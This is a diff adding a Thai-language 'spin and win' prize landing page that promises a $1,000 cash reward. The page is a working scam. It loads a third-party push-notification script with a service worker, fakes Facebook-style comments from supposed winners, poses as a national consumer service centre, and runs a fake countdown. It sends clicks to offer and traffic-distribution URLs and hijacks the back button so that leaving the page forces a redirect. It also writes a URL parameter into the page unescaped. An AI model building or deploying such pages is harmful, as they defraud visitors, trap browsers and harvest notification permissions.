@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+
+<head>
+    <title>ยินดีด้วย</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="lander" content="prizewheel-fb">
+    <meta name="description" content="prizewheel-fb">
+    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABn0lEQVQ4T83SzSsEcRjA8e9kasfY3dm8RFqsi3bXsl53rZbiSMqdg/KSg6vyJ3BVDg7KxU0pKQcuUttSHNhdXEjitlaLyYpGM5My1pZy8dzmeZ7fZ55n5idQIDRN6+f2domHh2ricZvRFonkcDrvcLunBUHY01PCT+e1i4thVHWVaFShthbW16GuDux2cDggFssiiiOCz7clsJrSviJ9VTIbFRmU9lYoKYHra0gkoKPDBD7j9DRLIDCUB5x1yXjb/KCqIEng9UI0CvPzVkCfJJE4twChcokd9zPOlibrZjMz+YDekUo9WoCpBheLqW1sE+O/A1ZWcn8FXi1AZ7nEbo2KMxgwJxBF8HhgdBRmZyEYhEwG0mmz/n0FIxeW8XUG4OnJPHx1ZV1nYQHm5sDlgpOTs7y/0Fsps1mVRWltLnTHzHwymcXvH8gD9NqgorHmeUfp6TYn+RqKwuN+DEcRA0Jj4/aPgN7fU1nMsgfcbyq2wwODyIXC3Igyk5cQG6w3bnFB4POl7WUSbaWS8Xh8/8JR+sUsjfl/BxT8EP8G+ADLLJpS1/YmQAAAAABJRU5ErkJggg==" type="image/x-icon">
+    <meta name="alert-message" content="We&#039;re sorry\n\nPlease try again. You have one more chance!">
+    <link href="css/app.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet" />
+    <link href="css/app8703.css?id=afa7f110a14f461eee6e" type="text/css" rel="stylesheet" />
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+    <script>
+        var s = document.createElement('script');
+        s.src='//phoashiw.net/act/files/micro.tag.min.js?z=7417207'+'&sw=/sw-check-permissions-9372d.js';
+        s.onload = function(result) {
+            switch (result) {
+                case 'onPermissionDefault':break;
+                case 'onPermissionAllowed':break;
+                case 'onPermissionDenied':break;
+                case 'onAlreadySubscribed':break;
+                case 'onNotificationUnsupported':break;
+            }
+        };
+        document.head.appendChild(s);
+    </script>
+    
+
+</head>
+
+<body>
+    <main id="app" v-cloak>
+        <div class="header">
+            หมุน &amp; ชนะ
+            <img class="header__icon" src="img/notification.png" alt="" />
+        </div>
+        <div class="step" v-if="!hasWon">
+            <div class="card">
+                <div class="step__text">
+                    <div class='step__date'>
+                        {{ DateHelper().getMonthName() }} {{ DateHelper().getDate() }}, {{ DateHelper().getYear() }}
+                    </div>
+                    <h1 class="step__title">
+                        ยินดีด้วย
+                        <script>
+                            document.write(getURLParameter('device_brand'))
+                        </script> ผู้ใช้ คุณมีรางวัลรออยู่ (1) รางวัล!!
+                    </h1>
+                    <div class="step__subtitle">
+                        ทั้งหมด <span class="strong">{{ DateHelper().getDayName() }}</span> เราเลือกผู้ใช้ผู้โชคดี 10 รายเพื่อรับรางวัล
+                    </div>
+                </div>
+                <div class="step__bar">
+                    รับรางวัลของคุณ<br/><em>↓</em> Spin the wheel <em>↓</em>
+                </div>
+                <vue-prize-wheel class="prize-wheel" static-image="img/prizewheel_static.png" prize-image="img/default@0.5x.png" :start-at="startPrizewheelAt" v-on:lost="retryModalOpen = true" v-on:finish="hasWon = true">
+                    <template v-slot:spinner>
+              <img
+                src="img/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/default%400.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+                </vue-prize-wheel>
+            </div>
+        </div>
+        <div class="step" v-if="hasWon && !isLoaded">
+            <div class="card step__loader">
+                <img src="img/loader.gif" alt="Loading" />
+            </div>
+        </div>
+        <div class="step step--end" v-if="isLoaded">
+            <div class="card card--centered">
+                <div class="step__title step__title--bold">
+                    ขอแสดงความยินดี! เพียงทำตามขั้นตอนเหล่านี้เพื่อรับรางวัลเงินสด 1,000 ดอลลาร์!
+                </div>
+            </div>
+            <div class="card">
+                <div>
+                    1. คลิก &#039;รับรางวัล&#039; เพื่อรับรางวัลของคุณ คุณจะถูกส่งไปยังพันธมิตรของเรา&#039;เว็บไซต์ของ</div>
+                <div>
+                    2. ทำตามขั้นตอนบนคู่ค้า&#039;เว็บไซต์ของ
+                </div>
+                <div>
+                    <span class="strong">สำคัญ:</span> สินค้าอาจจะไม่มีจำหน่ายได้ตลอดเวลา
+                </div>
+                <div>เลือกด่วน!</div>
+            </div>
+            <div class="card">
+                ข้อเสนอนี้มีผลใช้ได้ถึงเดือนถัดไป <span><span v-html="countdownMinutes">0</span> นาทีและ <span v-html="countdownSeconds">0</span> วินาที</span>
+            </div>
+            <div class="card">
+                <div class="step__prize">
+                    <div class="step__prize-image">
+                        <img src="img/default%400.5x.png" class="step__prize-image-image" alt="$850.00 Cash" />
+                        <div>(2) เหลือ</div>
+                    </div>
+                    <div class="step__prize-details">
+                        <div class="step__title step__title--bold">**รางวัลเงินสด 1,000 เหรียญ**</div>
+                        <a   onclick="go();"class="step__button">รับรางวัล</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="comments">
+            <div class="card">
+                <div class="comments__likes">
+                    <span class="comments__link">12,068</span> total likes.
+                </div>
+                <vue-facebook-comment avatar="img/3@0.25x.jpg" name="Sophie White" message="ตอนแรกฉันไม่แน่ใจว่านี่เป็นเรื่องจริงหรือเปล่า แต่ตอนนี้ฉันได้รับเงินสด 1,000 ดอลลาร์แล้ว :D!!" like-text="Like" reply-text="Reply" since-text="now" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/4@0.25x.jpg" name="James Lee" message="มีใครชนะอะไรบางอย่างจากการจับฉลากนี้บ้างไหม?" like-text="Like" reply-text="Reply" since-text="9 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/10@0.25x.jpg" name="Oliver Smith" message="มันทำงานอย่างไร? ฉันเคยได้รับบัตร Amazon เมื่อหลายปีที่แล้ว และพยายามทุกครั้งหลังจากนั้นก็ไม่ประสบความสำเร็จ..." like-text="Like" reply-text="Reply" since-text="32 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/6@0.25x.jpg" name="Amelia Martin" message="ช่วยฉันหน่อยได้ไหม ฉันเพิ่งได้รับบัตรของขวัญ!! ฉันควรทำอย่างไรต่อ?" :likes="12" like-text="Like" reply-text="Reply" since-text="55 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/9@0.25x.jpg" name="William Jones" message="รางวัลเงินสดมูลค่า 1,000 ดอลลาร์ได้มาถึงแล้ววันนี้ ขอบคุณ !!" :likes="12" image="img/proof.jpg" like-text="Like" reply-text="Reply" since-text="1 hour" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/5@0.25x.jpg" name="Emily Johnson" message="เห็นข้อเสนอนี้ครั้งเดียวแล้วก็กดออกเพราะคิดว่ามันปลอม ฉันเห็นโฆษณานี้อีกครั้งและเพราะเบื่อเลยตัดสินใจลองดู ... แล้วฉันก็ได้ iPhone 14 Pro ใหม่! อะไรนะ!!"
+                    like-text="Like" reply-text="Reply" since-text="3 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/1@0.25x.jpg" name="Ruby Smith" message="มันทำงานอย่างไร? ฉันเคยได้รับบัตร Amazon เมื่อหลายปีที่แล้ว และพยายามทุกครั้งหลังจากนั้นก็ไม่ประสบความสำเร็จ..." :likes="21" like-text="Like" reply-text="Reply" since-text="3 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <vue-facebook-comment avatar="img/2@0.25x.jpg" name="Alexander Martin" message="ไม่แน่ใจว่าจริงหรือไม่ แต่วันนี้ฉันได้รับการ์ดแล้ว!! 😍 สุดยอดมาก 🔥 🔥" :likes="1" like-text="Like" reply-text="Reply" since-text="6 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+                <p class="card__paragraph comments__link">
+                    See 83 older comments
+                </p>
+            </div>
+            <div class="card">
+                <div class="comments__form">
+                    <label for="reply">Add reply:</label>
+                    <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+                    <p class="card__paragraph">
+                        <button onclick="alert('Thank you for your comment, it will be published after being reviewed.');">
+                Submit
+              </button>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+            <div class="modal__title" style="">รับรางวัลเงินสดมูลค่า $.100,000</div>
+            <img class="modal__image" src="img/default%400.5x.png" alt="Rs.100,000 Cash" />
+            <p>
+                <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+                <br/> ยินดีด้วย
+                <script>
+                    document.write(getURLParameter('device_brand'))
+                </script> ผู้ใช้!
+                <br/> ศูนย์บริการผู้บริโภคแห่งชาติ ขอขอบพระคุณท่านที่ให้ความจงรักภักดี
+                <br/>
+            </p>
+            <p>
+                หมุนวงล้อเพื่อรับรางวัลพิเศษของคุณ 🎁
+                <br>
+                <br>
+                <span class="strong">ขอให้โชคดี!</span>
+            </p>
+            <button class="modal__button" v-on:click="welcomeModalOpen = false">OK</button>
+        </vue-modal>
+        <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+            <div class="modal__title" style="">ลองอีกครั้ง!</div>
+            <p>
+                *** คุณ&#039;ฉันได้ชนะสปินพิเศษหนึ่งครั้ง ***
+            </p>
+            <button class="modal__button" v-on:click="retryModalOpen = false">OK</button>
+        </vue-modal>
+    </main>
+    <script>
+        window.view = window.view || {};
+        view.offerUrl = "";
+        view.qs = null;
+        view.skip = 0;
+        view.screenshot = 0;
+        view.download = 1;
+        view.noredir = false;
+    </script>
+    <script>
+        window.view = window.view || {};
+        view.datetimeTranslations = {
+            "ago": ":time ago",
+            "from_now": ":time from now",
+            "after": ":time after",
+            "before": ":time before",
+            "year": "1 year|:count years",
+            "month": "1 month|:count months",
+            "week": "1 week|:count weeks",
+            "day": "1 day|:count days",
+            "hour": "1 hour|:count hours",
+            "minute": "1 minute|:count minutes",
+            "second": "1 second|:count seconds",
+            "january": "January",
+            "february": "February",
+            "march": "March",
+            "april": "April",
+            "may": "May",
+            "june": "June",
+            "july": "July",
+            "august": "August",
+            "september": "September",
+            "october": "October",
+            "november": "November",
+            "december": "December",
+            "monday": "Monday",
+            "tuesday": "Tuesday",
+            "wednesday": "Wednesday",
+            "thursday": "Thursday",
+            "friday": "Friday",
+            "saturday": "Saturday",
+            "sunday": "Sunday"
+        };
+    </script>
+    <script src="js/appa2ce.js" type="application/javascript">
+    </script>
+    <script>
+        var offer_url = "https://takedear.biz/click?lp=1";
+        var split_url = "https://news-paxitu.com/tds?id=1222362379&p1=sub1&p2=sub2&p3=sub3&p4=sub4";
+    
+        function go() {
+            window.onbeforeunload = null;
+            window.open(offer_url);
+            document.location.assign(split_url)
+        };
+    </script>
+        <script>
+            var bbURL = "https://news-paxitu.com/tds?id=1222362379&p1=sub1&p2=sub2&p3=sub3&p4=sub4";
+            ! function() {
+                var a;
+                try {
+                    for (a = 0; 3 > a; ++a) {
+                        history.pushState({}, "", "#")
+                    }
+                    onpopstate = function(c) {
+                        c.state && location.replace(bbURL)
+                    }
+                } catch (b) {}
+            }();
+        </script>
+</body>
+
+
+</html>
